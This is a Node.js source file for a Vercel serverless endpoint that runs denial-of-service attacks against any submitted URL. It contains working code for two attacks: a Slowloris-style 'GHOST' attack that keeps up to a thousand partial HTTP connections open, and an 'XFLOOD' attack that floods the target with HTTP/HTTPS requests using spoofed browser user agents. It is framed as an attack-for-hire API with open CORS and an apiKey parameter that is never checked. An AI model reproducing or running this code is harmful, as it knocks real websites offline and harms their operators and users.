// api/dos.js - KILLER_VOIDS CODING-MAX EDITION
const net = require('net');
const http = require('http');
const https = require('https');
const { URL } = require('url');

// Configuration
const MAX_CONNECTIONS = 1000;
const TIMEOUT = 30000;
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
];

class DOSTool {
    // GHOST ATTACK (Slowloris variant)
    static ghostAttack(target, duration) {
        return new Promise((resolve) => {
            const url = new URL(target);
            const host = url.hostname;
            const port = url.port || (url.protocol === 'https:' ? 443 : 80);
            const path = url.pathname || '/';
            
            let sockets = [];
            let attackActive = true;
            let totalSockets = 0;
            
            console.log(`[GHOST] Starting attack on ${host}:${port}`);
            
            // Create partial connections
            const createPartialConnection = () => {
                if (!attackActive || sockets.length >= MAX_CONNECTIONS) return;
                
                try {
                    const socket = net.createConnection({ host, port: parseInt(port) }, () => {
                        // Send incomplete HTTP request
                        socket.write(`GET ${path} HTTP/1.1\r\n`);
                        socket.write(`Host: ${host}\r\n`);
                        socket.write(`User-Agent: ${USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]}\r\n`);
                        socket.write(`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n`);
                        // Don't send the final \r\n\r\n - keep connection open
                    });
                    
                    socket.setTimeout(TIMEOUT);
                    socket.on('timeout', () => {
                        socket.destroy();
                        sockets = sockets.filter(s => s !== socket);
                    });
                    
                    socket.on('error', () => {
                        sockets = sockets.filter(s => s !== socket);
                    });
                    
                    sockets.push(socket);
                    totalSockets++;
                    
                    // Send more headers periodically to keep connection alive
                    const keepAlive = setInterval(() => {
                        if (socket.destroyed) {
                            clearInterval(keepAlive);
                            return;
                        }
                        socket.write(`X-${Date.now()}: ${Math.random()}\r\n`);
                    }, 15000);
                    
                    socket.on('close', () => {
                        clearInterval(keepAlive);
                        sockets = sockets.filter(s => s !== socket);
                    });
                    
                } catch (err) {
                    // Silent fail
                }
            };
            
            // Create connections continuously
            const connectionInterval = setInterval(createPartialConnection, 100);
            
            // Maintain connection pool
            const maintainPool = setInterval(() => {
                const needed = MAX_CONNECTIONS - sockets.length;
                for (let i = 0; i < needed; i++) {
                    createPartialConnection();
                }
            }, 500);
            
            // Stop attack after duration
            setTimeout(() => {
                attackActive = false;
                clearInterval(connectionInterval);
                clearInterval(maintainPool);
                
                // Close all sockets
                sockets.forEach(socket => socket.destroy());
                sockets = [];
                
                console.log(`[GHOST] Attack finished. Total sockets created: ${totalSockets}`);
                resolve({ method: 'GHOST', totalSockets, target, duration });
            }, duration * 1000);
        });
    }
    
    // XFLOOD ATTACK (HTTP/HTTPS Flood)
    static xfloodAttack(target, duration) {
        return new Promise((resolve) => {
            const url = new URL(target);
            const protocol = url.protocol === 'https:' ? https : http;
            const options = {
                hostname: url.hostname,
                port: url.port || (url.protocol === 'https:' ? 443 : 80),
                path: url.pathname || '/',
                method: 'GET',
                headers: {
                    'Host': url.hostname,
                    'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
            };
            
            let requestCount = 0;
            let errorCount = 0;
            let attackActive = true;
            
            console.log(`[XFLOOD] Starting flood attack on ${target}`);
            
            // Flood function
            const sendRequest = () => {
                if (!attackActive) return;
                
                try {
                    const req = protocol.request(options, (res) => {
                        res.on('data', () => {});
                        res.on('end', () => {
                            requestCount++;
                        });
                    });
                    
                    req.on('error', () => {
                        errorCount++;
                    });
                    
                    req.setTimeout(5000, () => {
                        req.destroy();
                    });
                    
                    req.end();
                    requestCount++;
                    
                } catch (err) {
                    errorCount++;
                }
            };
            
            // Start flood with multiple threads
            const threads = 50;
            const intervals = [];
            
            for (let i = 0; i < threads; i++) {
                intervals.push(setInterval(sendRequest, 10));
            }
            
            // Stop attack after duration
            setTimeout(() => {
                attackActive = false;
                intervals.forEach(interval => clearInterval(interval));
                
                console.log(`[XFLOOD] Attack finished. Requests: ${requestCount}, Errors: ${errorCount}`);
                resolve({ 
                    method: 'XFLOOD', 
                    requestsSent: requestCount, 
                    errors: errorCount,
                    target, 
                    duration 
                });
            }, duration * 1000);
        });
    }
}

// API Handler for Vercel
module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const { target, duration, method, apiKey } = req.body;
        
        // Simple validation
        if (!target || !duration || !method) {
            return res.status(400).json({ error: 'Missing required parameters' });
        }
        
        // Validate URL
        let targetUrl;
        try {
            targetUrl = new URL(target);
            if (!['http:', 'https:'].includes(targetUrl.protocol)) {
                throw new Error('Invalid protocol');
            }
        } catch (err) {
            return res.status(400).json({ error: 'Invalid URL format' });
        }
        
        // Validate duration
        const durationSec = parseInt(duration);
        if (isNaN(durationSec) || durationSec < 1 || durationSec > 300) {
            return res.status(400).json({ 
                error: 'Duration must be between 1 and 300 seconds' 
            });
        }
        
        console.log(`Starting ${method} attack on ${target} for ${durationSec} seconds`);
        
        // Start attack based on method
        let result;
        if (method === 'GHOST') {
            result = await DOSTool.ghostAttack(target, durationSec);
        } else if (method === 'XFLOOD') {
            result = await DOSTool.xfloodAttack(target, durationSec);
        } else {
            return res.status(400).json({ error: 'Invalid method' });
        }
        
        res.status(200).json({
            success: true,
            message: `Attack completed successfully`,
            attackInfo: result
        });
        
    } catch (error) {
        console.error('Attack error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error',
            message: error.message 
        });
    }
};